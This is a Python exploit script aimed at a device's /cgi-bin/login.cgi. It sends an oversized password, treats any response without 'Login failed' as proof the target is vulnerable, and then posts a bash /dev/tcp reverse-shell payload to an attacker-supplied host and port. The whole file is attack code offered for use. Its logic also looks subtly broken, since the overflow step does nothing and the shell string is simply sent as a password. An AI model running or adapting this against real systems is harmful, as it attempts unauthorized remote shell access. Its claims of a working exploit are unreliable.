import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def exploit(target, lhost, lport):
    print(f"[*] Exploiting {target}...")
    url = f"https://{target}/"

    # Step 1: POST request to /cgi-bin/login.cgi with a long password
    long_password = "A" * 10000
    data = {"login": "admin", "password": long_password}
    try:
        r = requests.post(url + "cgi-bin/login.cgi", data=data, verify=False, timeout=5)
    except:
        print("[!] Failed to connect to target.")
        sys.exit(1)

    # Step 2: Check if the target is vulnerable
    if "Login failed" not in r.text:
        print("[+] Target is vulnerable!")
    else:
        print("[-] Target is not vulnerable.")
        sys.exit(1)

    # Step 3: Set up a reverse shell payload
    payload = f"/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    print(f"[*] Sending payload: {payload}")

    # Step 4: POST request to /cgi-bin/login.cgi with the payload as the password
    data = {"login": "admin", "password": payload}
    r = requests.post(url + "cgi-bin/login.cgi", data=data, verify=False, timeout=5)

    print("[+] Exploit complete. Check your listener.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target> <lhost> <lport>")
        sys.exit(1)
    
    target = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]
    exploit(target, lhost, lport)
